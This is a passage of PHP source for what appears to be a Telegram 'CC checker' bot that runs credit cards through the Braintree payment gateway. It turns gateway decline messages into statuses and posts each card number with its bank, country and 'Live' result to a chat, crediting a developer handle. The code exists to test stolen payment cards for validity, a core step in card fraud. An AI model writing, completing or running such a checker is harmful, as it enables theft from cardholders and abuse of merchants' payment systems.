$status = ("Declined ❌");  
$respo = ("Cannot Authorize at this time (Life cycle)");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Unknown or expired payment_method_nonce.")) {
$status = ("Declined ❌");  
$respo = ("BIN country in high risk country - Decline (40184)");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Processor Declined - Fraud Suspected")) {
$status = ("Declined ❌");  
$respo = ("Processor Declined - Fraud Suspected");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Invalid Transaction")) {
$status = ("Declined ❌");  
$respo = ("Invalid Transaction");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Transaction Not Allowed")) {
$status = ("Declined ❌");  
$respo = ("Transaction Not Allowed");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Gateway Rejected: three_d_secure")) {
$status = ("Declined ❌");  
$respo = ("Gateway Rejected: three_d_secure");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. No Account")) {
$status = ("Declined ❌");  
$respo = ("No Account");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Expired Card")) {
$status = ("Declined ❌");  
$respo = ("Expired Card");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Processor Declined")) {
$status = ("Declined ❌");  
$respo = ("Processor Declined");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Merchant account does not support 3D Secure transactions for card type.")) {
$status = ("Declined ❌");  
$respo = ("Merchant account does not support 3D Secure transactions for card type");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Limit Exceeded")) {
$status = ("Declined ❌");  
$respo = ("Limit Exceeded");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Authentication Required")) {
$status = ("Declined ❌");  
$respo = ("Authentication Required");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Cannot Authorize at this time (Policy)")) {
$status = ("Declined ❌");  
$respo = ("Cannot Authorize at this time (Policy)");
}


else {
$status = ("Declined ❌");  
$respo = ("$msg");
}


$end_time = microtime(true);
$time = number_format($end_time - $start_time, 2);
//=============CHECKER END=============//
bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtovbv,
'text'=>"<b>
BRAINTREE 🌩
━━━━━━━━━━━━━
[ϟ]Card: <code>$lista</code> 
[ϟ]Status: $status
[ϟ]Result: $respo

[ϟ]Brand: <code>$level-$brand</code>
[ϟ]Type: <code>$type</code>
[ϟ]Bank: <code>$bank</code>
[ϟ]Country: <code>$country_name [$country_flag]</code>

[ϟ]T: <code>$time SEC</code> | P: <code>Live ✅</code>
━━━━━━━━━━━━━
[ϟ]Req: <b>@$username</b> [$rank]
[ϟ]Dev: <code>@celestial_being</code>

</b>",
      'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);
recordBotResponseTimestamp($userId);
  }else{
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtovbv,
            'text'=>"<b>Provide a Valid CC</b>",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
        ]);

        }
    